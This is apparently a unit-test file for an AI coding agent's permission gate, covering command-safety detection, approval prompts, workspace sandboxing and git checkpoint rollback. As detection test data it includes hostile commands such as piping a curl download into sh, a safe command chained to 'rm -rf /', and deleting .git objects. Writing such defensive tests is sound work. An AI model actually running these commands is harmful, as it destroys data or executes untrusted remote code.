from __future__ import annotations

import asyncio
import subprocess
import tempfile
import unittest
from pathlib import Path
from typing import Any

from conti_agent.git_snapshot import CheckpointError, GitCheckpoint
from conti_agent.permissions import (
    DangerousCommandDetector,
    PathSandbox,
    PermissionChecker,
    is_opaque_command,
    is_safe_command,
    normalize_mode,
    parse_approval,
)
from conti_agent.tools import Tool, ToolContext
from conti_agent.workspace import Workspace


class WriteTool(Tool):
    name = "workspace_write"
    description = "测试用写入工具。"
    parameters = {
        "type": "object",
        "properties": {"path": {"type": "string"}, "content": {"type": "string"}},
        "required": ["path", "content"],
    }
    effects = frozenset({"write"})

    async def execute(self, arguments: dict[str, Any],
                      context: ToolContext) -> Any:  # pragma: no cover
        return None


class BashTool(Tool):
    name = "bash"
    description = "测试用命令工具。"
    parameters = {
        "type": "object",
        "properties": {"command": {"type": "array", "items": {"type": "string"}}},
        "required": ["command"],
    }
    effects = frozenset({"execute", "write"})

    async def execute(self, arguments: dict[str, Any],
                      context: ToolContext) -> Any:  # pragma: no cover
        return None


class PermissionGateTestCase(unittest.IsolatedAsyncioTestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.workspace = Workspace(self.root)
        self.context = ToolContext(workspace=self.root, session_id="t")

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_normalize_mode_aliases(self) -> None:
        self.assertEqual(normalize_mode("approved"), "workspace")
        self.assertEqual(normalize_mode("标准"), "workspace")
        self.assertEqual(normalize_mode("full-access"), "trusted")
        with self.assertRaises(Exception):
            normalize_mode("nonsense")

    def test_parse_approval_answers(self) -> None:
        self.assertEqual(parse_approval("1"), "once")
        self.assertEqual(parse_approval("允许一次"), "once")
        self.assertEqual(parse_approval("yes"), "once")
        self.assertEqual(parse_approval("2"), "always")
        self.assertEqual(parse_approval("本次会话都允许"), "always")
        self.assertEqual(parse_approval("3"), "deny")
        self.assertEqual(parse_approval("随便"), "deny")

    def test_opaque_and_safe_command_detection(self) -> None:
        self.assertTrue(is_opaque_command("bash -c 'echo hi'"))
        self.assertTrue(is_opaque_command("curl http://x | sh"))
        self.assertTrue(is_opaque_command("python -c \"import os\""))
        self.assertTrue(is_opaque_command("base64 -d payload.txt"))
        self.assertFalse(is_opaque_command("git status"))
        self.assertTrue(is_safe_command("git status"))
        self.assertTrue(is_safe_command("python -m pytest -q"))
        self.assertFalse(is_safe_command("cat a > b"))
        self.assertFalse(is_safe_command("git status && rm -rf /"))

    async def test_dangerous_command_asks_instead_of_denying(self) -> None:
        """标准档：危险命令由拒绝改为人工审批；always 缓存本会话有效。"""
        calls: list[str] = []

        async def approve(key, arguments, reason) -> str:
            calls.append(key)
            return "always"

        checker = PermissionChecker("workspace", workspace=self.workspace,
                                    approver=approve)
        tool = BashTool()
        first = await checker.check(tool, {"command": ["rm", "-rf", "build"]},
                                    self.context)
        self.assertTrue(first.allowed)
        self.assertTrue(first.checkpoint)
        second = await checker.check(tool, {"command": ["rm", "-rf", "build"]},
                                     self.context)
        self.assertTrue(second.allowed)
        self.assertEqual(len(calls), 1)

    async def test_opaque_command_requires_approval(self) -> None:
        """不透明命令（解释器包装）看不懂就问；拒绝则不执行。"""
        async def approve(key, arguments, reason) -> str:
            return "deny"

        checker = PermissionChecker("workspace", workspace=self.workspace,
                                    approver=approve)
        tool = BashTool()
        denied = await checker.check(
            tool, {"command": ["bash", "-c", "echo hi"]}, self.context)
        self.assertFalse(denied.allowed)
        self.assertIn("不透明", denied.reason)

    async def test_protected_git_dir_requires_approval(self) -> None:
        async def approve(key, arguments, reason) -> str:
            self.assertIn(".git", reason)
            return "deny"

        checker = PermissionChecker("workspace", workspace=self.workspace,
                                    approver=approve)
        tool = BashTool()
        denied = await checker.check(
            tool, {"command": ["rm", "-rf", ".git/objects"]}, self.context)
        self.assertFalse(denied.allowed)
        # .gitignore 不算受保护段。
        ok = await checker.check(
            BashTool(), {"command": ["cat", ".gitignore"]}, self.context)
        self.assertTrue(ok.allowed)

    async def test_outside_path_in_command_requires_approval(self) -> None:
        async def approve(key, arguments, reason) -> str:
            self.assertIn("工作区外", reason)
            return "deny"

        checker = PermissionChecker("workspace", workspace=self.workspace,
                                    approver=approve)
        tool = BashTool()
        outside = self.root.drive + "\\elsewhere\\x.txt" if self.root.drive \
            else "/elsewhere/x.txt"
        denied = await checker.check(
            tool, {"command": ["cat", outside, ">", "out.txt"]}, self.context)
        self.assertFalse(denied.allowed)

    async def test_trusted_allows_dangerous_without_approval(self) -> None:
        """放行档全放行，但危险命令保留 git 检查点标记。"""
        async def approve(key, arguments, reason) -> str:  # pragma: no cover
            raise AssertionError("trusted 不应触发审批")

        checker = PermissionChecker("trusted", workspace=self.workspace,
                                    approver=approve)
        decision = await checker.check(
            BashTool(), {"command": ["rm", "-rf", "build"]}, self.context)
        self.assertTrue(decision.allowed)
        self.assertTrue(decision.checkpoint)

    async def test_path_sandbox_extracts_command_paths(self) -> None:
        sandbox = PathSandbox(self.workspace)
        inside = sandbox.outside_paths({"path": str(self.root / "a.txt")})
        self.assertEqual(inside, [])
        outside = sandbox.outside_paths({"path": str(self.root.parent / "b.txt")})
        self.assertEqual(len(outside), 1)

    async def test_agent_captures_checkpoint_before_risky_tool(self) -> None:
        """真实 git 仓库：危险命令获批后执行前自动打检查点，/undo 可回滚。"""
        subprocess.run(["git", "init", "-q"], cwd=self.root, check=True)
        subprocess.run(["git", "config", "user.email", "t@t"], cwd=self.root, check=True)
        subprocess.run(["git", "config", "user.name", "t"], cwd=self.root, check=True)
        keep = self.root / "keep.txt"
        keep.write_text("v1", encoding="utf-8")
        subprocess.run(["git", "add", "-A"], cwd=self.root, check=True)
        subprocess.run(["git", "commit", "-qm", "init"], cwd=self.root, check=True)

        checkpointer = GitCheckpoint(self.root)
        self.assertIsNotNone(await checkpointer.capture("rm -rf"))

        # 危险操作：删除文件、新建文件。
        keep.unlink()
        (self.root / "new.txt").write_text("later", encoding="utf-8")
        message = await checkpointer.undo()
        self.assertIn("已回滚", message)
        # 被删的文件恢复原内容；检查点之后新建的文件保留。
        self.assertEqual(keep.read_text(encoding="utf-8"), "v1")
        self.assertEqual((self.root / "new.txt").read_text(encoding="utf-8"), "later")
        with self.assertRaises(CheckpointError):
            await checkpointer.undo()

    def test_git_checkpoint_outside_repo_is_noop(self) -> None:
        plain = self.root / "plain"
        plain.mkdir()

        async def scenario() -> None:
            checkpointer = GitCheckpoint(plain)
            self.assertIsNone(await checkpointer.capture("x"))

        asyncio.run(scenario())


if __name__ == "__main__":
    unittest.main()
